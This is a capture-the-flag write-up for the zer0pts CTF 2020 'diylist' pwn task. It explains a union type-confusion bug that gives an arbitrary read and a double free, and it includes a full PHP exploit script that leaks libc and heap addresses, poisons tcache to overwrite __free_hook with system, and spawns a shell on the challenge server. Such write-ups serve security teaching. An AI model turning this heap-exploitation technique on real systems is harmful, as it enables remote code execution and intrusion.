# diylist - zer0pts CTF 2020 (pwn, 453p, 36 solved)
## Introduction

diylist is a pwn task.

An archive containing a binary, a library, and its source code is provided.

The binary allows the user to manage a to-do list. The list can contain a value
of type char, long or double.

## Vulnerability

The list is internally represented by a structure and an union:
```c
typedef union {
  char *p_char;
  long d_long;
  double d_double;
} Data;

typedef struct {
  int size;
  int max;
  Data *data;
} List;
```

Unions often leads to type confusion bugs.

The user is asked what type his list is prior to showing it. It is possible to
confuse a long value with a string pointer, leading to an arbitrary read
vulnerability.

When adding a string item, its value is duplicated with `strdup` in a pool of
strings. When deleting this item the binary will search for the pointer in this
pool, and free it if it present. The pointer is not removed from the pool.

This cause a problem if an attacker can predict the address at which a string is
allocated. If they do, they can allocate a new item with a long value that
contains a pointer to a free string. The binary will then free it a second time
because the value, albeit not a string, is present in the string pool.

This causes as double-free vulnerability.

## Exploitation

The exploitation is quite straightforward, and goes like this:
1. create a long item with a value that points to the binary's `.GOT.PLT`
   section
2. read this value as a string to leak a libc address
3. create a string item
4. read this value as a long to leak the heap address
5. create a new long value that contains the heap address
6. free both values to get a double free
7. abuse the regular tcache-poisoning attack to allocate an arbitrary buffer in
   libc's `__free_hook`

The usual strategy is to replace `__free_hook` with `system` and call `free` on
a buffer that contains `/bin/sh`.

**Flag**: `zer0pts{m4y_th3_typ3_b3_w1th_y0u}`

## Appendices

### pwn.php

```php
#!/usr/bin/php
<?php
require_once("Socket.php");

function menu(Tube $t)
{
	$t->expectLine("1. list_add");
	$t->expectLine("2. list_get");
	$t->expectLine("3. list_edit");
	$t->expectLine("4. list_del");
	$t->expect("> ");
}

function add(Tube $t, $type, $data)
{
	menu($t);
	$t->write("1\n");

	$t->expect("Type(long=1/double=2/str=3): ");
	$t->write("$type\n");

	$t->expect("Data: ");
	$t->write($data);
}

function get(Tube $t, $idx, $type)
{
	menu($t);
	$t->write("2\n");

	$t->expect("Index: ");
	$t->write("$idx\n");

	$t->expect("Type(long=1/double=2/str=3): ");
	$t->write("$type\n");

	$t->expect("Data: ");
	return $t->readLine();
}

function edit(Tube $t, $idx, $type, $data)
{
	menu($t);
	$t->write("3\n");

	$t->expect("Index: ");
	$t->write("$idx\n");

	$t->expect("Type(long=1/double=2/str=3): ");
	$t->write("$type\n");

	$t->expect("Data: ");
	$t->write($data);
}


function del(Tube $t, $idx, $early = false)
{
	menu($t);
	$t->write("4\n");

	$t->expect("Index: ");
	$t->write("$idx\n");

	if($early)
		return;

	$t->expectLine("Successfully removed");
}

$t = new Socket("13.231.207.73", 9007);


/* Payload */
add($t, 3, "/bin/sh\0");

/* Leak libc */
add($t, 1, 0x00602018); // puts
$leak = get($t, 1, 3);
$leak = str_pad($leak, 8, "\x00");
$addr = unpack("Q", $leak)[1];
$libc = $addr - 0x00000000000809c0;
printf("libc: %X\n", $libc);
del($t, 1);

/* Leak heap */
add($t, 3, "XeR");
$heap = 0 | get($t, 1, 1);
printf("heap: %x\n", $heap);

/* Double free */
add($t, 1, $heap);
del($t, 2);
del($t, 1);


add($t, 3, pack("Q", $libc + 0x003ed8e8));
add($t, 3, pack("Q", 0));
add($t, 3, pack("Q", $libc + 0x0004f440));

del($t, 0, true);


printf("shell\n");
$t->pipe();
```